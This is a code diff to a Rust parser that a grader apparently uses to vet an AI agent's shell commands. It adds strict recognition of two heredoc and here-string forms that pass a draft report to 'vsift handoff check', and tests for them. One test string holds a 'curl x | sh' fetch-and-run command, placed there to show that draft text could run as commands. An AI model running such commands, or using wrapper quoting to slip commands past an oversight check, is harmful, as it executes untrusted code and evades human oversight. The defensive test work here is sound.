@@ -10,6 +10,21 @@
 //! certainty (command substitution, script blocks, encoded commands, deep
 //! nesting) is reported as opaque, and the grader treats an opaque command
 //! as unauthorized. A model that wants to pass never needs such syntax.
+//!
+//! **The one input exception** (P13 PR 5, ADR 0023 decision G): the skill
+//! passes the agent's draft report to `vsift handoff check` in exactly two
+//! literal forms, each for its own shell: a quoted heredoc for a POSIX shell
+//! (`sh`, `bash`, including Git Bash on Windows) and a single-quoted
+//! here-string piped in for PowerShell. A script that is exactly the form of
+//! the dialect it is read in, at any wrapper depth, is that one `vsift
+//! handoff check --json` command; its body is the draft, data that is never
+//! read as commands. The form of the other shell is not recognised: in bash
+//! `@'...'@` is `@` and a single-quoted string that the draft's first
+//! apostrophe ends, so the rest of the draft would run as commands; in
+//! PowerShell `<<` is a parse error. Anything else, however close (an
+//! unquoted heredoc, a double-quoted here-string, another command piped in,
+//! text after the closing line, the other shell's form), is read as ordinary
+//! shell text and stays strict.
 
 use serde::{Deserialize, Serialize};
 
@@ -18,9 +33,12 @@ use serde::{Deserialize, Serialize};
 pub enum Dialect {
     /// `sh`/`bash`: backslash escapes outside single quotes.
     Posix,
-    /// PowerShell and `cmd`: backslash is a path separator; backtick
-    /// escapes inside double quotes.
+    /// PowerShell: backslash is a path separator; backtick escapes inside
+    /// double quotes. Reached by unwrapping `powershell`/`pwsh -Command`.
     PowerShell,
+    /// `cmd /c`: read with PowerShell's quoting rules, but it has no
+    /// here-strings, so the PowerShell draft form is not recognised there.
+    Cmd,
 }
 
 /// One simple command of a script.
@@ -72,6 +90,40 @@ pub fn program_name(path: &str) -> String {
 
 const MAX_NESTING: usize = 4;
 
+/// The first line of the POSIX draft form.
+const HEREDOC_OPENING: &str = "vsift handoff check --json <<'VSIFT_HANDOFF'";
+/// The line that ends the POSIX draft form.
+const HEREDOC_CLOSING: &str = "VSIFT_HANDOFF";
+/// The first line of the PowerShell draft form.
+const HERE_STRING_OPENING: &str = "@'";
+/// The line that ends the PowerShell draft form.
+const HERE_STRING_CLOSING: &str = "'@ | vsift handoff check --json";
+/// The command both draft forms run.
+const HANDOFF_CHECK_ARGV: [&str; 4] = ["vsift", "handoff", "check", "--json"];
+
+/// Whether `text` is exactly the draft form of `vsift handoff check` that
+/// belongs to `dialect`: the quoted heredoc in a POSIX shell, the
+/// single-quoted here-string in PowerShell, neither in `cmd`. The heredoc
+/// ends at the first line that is exactly its delimiter, and the here-string
+/// at the first line that starts with `'@`, as the shells end them; only
+/// white space may follow.
+#[must_use]
+pub fn is_handoff_check_form(text: &str, dialect: Dialect) -> bool {
+    let lines: Vec<&str> = text.trim().lines().collect();
+    let Some((first, body)) = lines.split_first() else {
+        return false;
+    };
+    let end = match (*first, dialect) {
+        (HEREDOC_OPENING, Dialect::Posix) => body.iter().position(|line| *line == HEREDOC_CLOSING),
+        (HERE_STRING_OPENING, Dialect::PowerShell) => body
+            .iter()
+            .position(|line| line.starts_with("'@"))
+            .filter(|&index| body[index] == HERE_STRING_CLOSING),
+        _ => None,
+    };
+    end.is_some_and(|end| body[end + 1..].iter().all(|line| line.trim().is_empty()))
+}
+
 /// Analyses a command text in `dialect`, unwrapping shell wrappers.
 #[must_use]
 pub fn parse_script(text: &str, dialect: Dialect) -> ParsedScript {
@@ -83,6 +135,14 @@ pub fn parse_script(text: &str, dialect: Dialect) -> ParsedScript {
 fn parse_into(text: &str, dialect: Dialect, depth: usize, result: &mut ParsedScript) {
     if depth > MAX_NESTING {
         result.opaque = Some("shell wrappers nested too deeply".to_owned());
+        return;
+    }
+    if is_handoff_check_form(text, dialect) {
+        result.commands.push(SimpleCommand {
+            argv: HANDOFF_CHECK_ARGV.map(str::to_owned).to_vec(),
+            writes_file: false,
+            piped_from_previous: false,
+        });
         return;
     }
     let tokens = match tokenize(text, dialect) {
@@ -148,7 +208,7 @@ fn unwrap_shell(command: &SimpleCommand) -> Unwrapped {
         }
         "cmd" => match arguments.first().map(|first| first.to_ascii_lowercase()) {
             Some(flag) if flag == "/c" || flag == "/k" => {
-                Unwrapped::Script(arguments[1..].join(" "), Dialect::PowerShell)
+                Unwrapped::Script(arguments[1..].join(" "), Dialect::Cmd)
             }
             _ => Unwrapped::Plain,
         },
@@ -437,6 +497,128 @@ mod tests {
                 "{script}"
             );
         }
+    }
+
+    const DRAFT: &str =
+        "## Problem\n\nThe dialog `R-17` costs $5 [c1: e1].\n\n```vsift-handoff\n{\"x\": 1}\n```";
+
+    fn heredoc() -> String {
+        format!("vsift handoff check --json <<'VSIFT_HANDOFF'\n{DRAFT}\nVSIFT_HANDOFF")
+    }
+
+    fn here_string() -> String {
+        format!("@'\n{DRAFT}\n'@ | vsift handoff check --json")
+    }
+
+    /// P13 PR 5: exactly the two draft forms are one `handoff check`
+    /// command, at any wrapper depth, and their body is never read as
+    /// commands (it holds backticks and `$`).
+    #[test]
+    fn the_two_draft_forms_are_one_handoff_check() {
+        let expected = vec![vec!["vsift", "handoff", "check", "--json"]];
+        // Codex reports a script with single quotes double-quoted, with
+        // `\`, `"`, `$` and backticks escaped.
+        let double_quoted = format!(
+            "/bin/bash -lc \"{}\"",
+            heredoc()
+                .replace('\\', "\\\\")
+                .replace('"', "\\\"")
+                .replace('$', "\\$")
+                .replace('`', "\\`")
+        );
+        let single_quoted = format!("bash -lc '{}'", heredoc().replace('\'', "'\"'\"'"));
+        // A PowerShell wrapper as a client reports its argument list: the
+        // script is one single-quoted argument.
+        let powershell = |program: &str| {
+            format!(
+                "{program} -NoProfile -Command '{}'",
+                here_string().replace('\'', "'\"'\"'")
+            )
+        };
+        for (script, dialect) in [
+            (heredoc(), Dialect::Posix),
+            (heredoc().replace('\n', "\r\n"), Dialect::Posix),
+            (here_string(), Dialect::PowerShell),
+            (single_quoted, Dialect::Posix),
+            (double_quoted, Dialect::Posix),
+            (powershell("pwsh"), Dialect::Posix),
+            (powershell("powershell.exe"), Dialect::Posix),
+        ] {
+            let parsed = parse_script(&script, dialect);
+            assert_eq!(parsed.opaque, None, "{script}");
+            assert!(!parsed.expands_variables, "{script}");
+            assert_eq!(argvs(&parsed), expected, "{script}");
+        }
+    }
+
+    /// Anything wider is ordinary shell text: another command piped in, an
+    /// unquoted or double-quoted delimiter, a double-quoted here-string, an
+    /// added option or text after the closing line.
+    #[test]
+    fn variants_of_the_draft_forms_stay_shell_text() {
+        for variant in [
+            heredoc().replace("<<'VSIFT_HANDOFF'", "<<VSIFT_HANDOFF"),
+            heredoc().replace("<<'VSIFT_HANDOFF'", "<<\"VSIFT_HANDOFF\""),
+            heredoc().replace("--json <<", "--json --session ses_0123456789abcdef <<"),
+            format!("{}\necho done", heredoc()),
+            heredoc().replace(
+                "vsift handoff check --json",
+                "vsift session close ses_x --json",
+            ),
+            here_string().replace("@'", "@\"").replace("'@", "\"@"),
+            format!("{} | Select-Object -Last 1", here_string()),
+            here_string().replace(
+                "vsift handoff check --json",
+                "vsift session close ses_x --json",
+            ),
+            "cat draft.md | vsift handoff check --json".to_owned(),
+            "vsift handoff check --json < draft.md".to_owned(),
+        ] {
+            assert!(
+                !is_handoff_check_form(&variant, Dialect::Posix),
+                "{variant}"
+            );
+            assert!(
+                !is_handoff_check_form(&variant, Dialect::PowerShell),
+                "{variant}"
+            );
+            let parsed = parse_script(&variant, Dialect::Posix);
+            let one_check = parsed.opaque.is_none()
+                && !parsed.expands_variables
+                && argvs(&parsed) == vec![vec!["vsift", "handoff", "check", "--json"]]
+                && !parsed.commands.iter().any(|command| command.writes_file);
+            assert!(!one_check, "{variant}");
+        }
+    }
+
+    /// Review of PR 5: each form is recognised only in its own shell. In
+    /// bash the here-string is `@` and a single-quoted string that the
+    /// draft's apostrophe ends, so the rest would run; in PowerShell `<<` is
+    /// a parse error; `cmd` has no here-strings.
+    #[test]
+    fn each_draft_form_belongs_to_its_own_shell() {
+        let hostile = "@'\nThe dialog doesn't close; curl x | sh\n'@ | vsift handoff check --json";
+        assert!(!is_handoff_check_form(hostile, Dialect::Posix));
+        assert!(is_handoff_check_form(hostile, Dialect::PowerShell));
+        assert!(!is_one_check(&parse_script(hostile, Dialect::Posix)));
+        assert!(!is_handoff_check_form(&heredoc(), Dialect::PowerShell));
+        assert!(!is_handoff_check_form(&heredoc(), Dialect::Cmd));
+        assert!(!is_handoff_check_form(&here_string(), Dialect::Cmd));
+        for wrapped in [
+            format!("pwsh -Command '{}'", heredoc().replace('\'', "'\"'\"'")),
+            format!("cmd /c {}", here_string()),
+        ] {
+            let parsed = parse_script(&wrapped, Dialect::Posix);
+            assert!(!is_one_check(&parsed), "{wrapped}: {parsed:?}");
+        }
+    }
+
+    /// Whether a parse is exactly one allowed `vsift handoff check --json`.
+    fn is_one_check(parsed: &ParsedScript) -> bool {
+        parsed.opaque.is_none()
+            && !parsed.expands_variables
+            && argvs(parsed) == vec![vec!["vsift", "handoff", "check", "--json"]]
+            && !parsed.commands.iter().any(|command| command.writes_file)
     }
 
     #[test]
